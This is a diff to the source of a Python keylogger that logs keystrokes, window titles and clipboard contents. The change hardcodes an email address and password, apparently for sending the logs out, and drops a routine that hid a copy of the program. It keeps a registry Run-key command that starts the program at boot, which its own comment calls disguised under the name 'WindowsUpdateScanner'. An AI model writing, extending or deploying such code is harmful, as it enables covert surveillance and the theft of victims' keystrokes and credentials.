@@ -23,8 +23,8 @@ from subprocess import call
 
 file_path = sys.argv[0]
 file_name = __file__.split('\\')[-1]
-#my_email = " "
-#my_password = " "
+my_email = "pythontesting1219@gmail.com"
+my_password = "Testing95"
 
 window_log = []
 keys_pressed = []
@@ -33,32 +33,11 @@ clipboard_log = []
 all_clips = []
 
 
-def make_a_substitute_dir():  # This function makes a seceret copy of the keylogger somewhere else
-    global path_of_other_folder
-
-    username = getpass.getuser()
-    path_of_other_folder = fr'C:\Users\{username}\WindowsUpdateScanner'
-    try:
-        for direct in os.listdir(path_of_other_folder):
-            d = path_of_other_folder + "\\" + direct
-            os.remove(d)
-    except Exception as e:
-        print(e)
-    if os.path.isdir(path_of_other_folder):
-        pass
-    else:
-        os.mkdir(path_of_other_folder)
-    shutil.copy2(file_path, path_of_other_folder)
-
-
-make_a_substitute_dir()
 
 
 def add_to_start():
-    path_to_add_to_reg = path_of_other_folder + \
-        "\\" + os.listdir(path_of_other_folder)[0]
     os.system(
-        f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdateScanner /t REG_SZ /d {path_to_add_to_reg} /f"')  # This command will add this file to the startup registry. It will be disguised with the name WindowsUpdateScanner
+        f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdateScanner /t REG_SZ /d {file_path} /f"')  # This command will add this file to the startup registry. It will be disguised with the name WindowsUpdateScanner
 
 
 def subprocess_commands():
